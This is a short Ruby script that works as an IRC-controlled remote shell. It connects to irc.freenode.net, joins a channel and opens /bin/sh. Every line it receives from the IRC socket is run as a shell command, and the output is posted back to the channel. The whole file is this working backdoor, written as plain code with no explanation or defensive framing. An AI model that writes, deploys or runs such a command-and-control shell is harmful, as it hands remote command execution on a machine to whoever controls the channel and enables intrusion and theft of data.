require 'socket'

$port = 6667
$hostname = "irc.freenode.net"
$nick = "COMPjfkre"
$channel ="#foobarbazqup"
$sock = TCPSocket.open($hostname,$port)

def startShell()
    $shell = IO.popen("/bin/sh",mode="a+")
    $shell.puts "ls"

    th = Thread.new do
        while (line = $shell.gets)
           ircSay(line)
        end
    end

#    while true
#        bar = gets
#        foo.puts bar
#    end
end

def ircSay(message)
    $sock.puts "PRIVMSG " + $channel + " :#{message}"
end

def ircConnect()
$sock.puts "NICK "+ $nick
$sock.puts "USER "+ $nick +" 4 * : " + $nick

while (line = $sock.gets)
puts line
if line.eql?(":"+$nick+" MODE "+$nick+" :+i\r\n")
    puts "CHANNEL JOINED"
    break
end

end
sleep(1)
$sock.puts "JOIN "+$channel
sleep(3)
end




ircConnect()
startShell()
$shell.puts "ls -l"


while (line=$sock.gets)
    puts line.inspect
        puts "Command Recieved"
        line = line.chomp
        $shell.puts line
end

$sock.puts "QUIT"
$sock.close
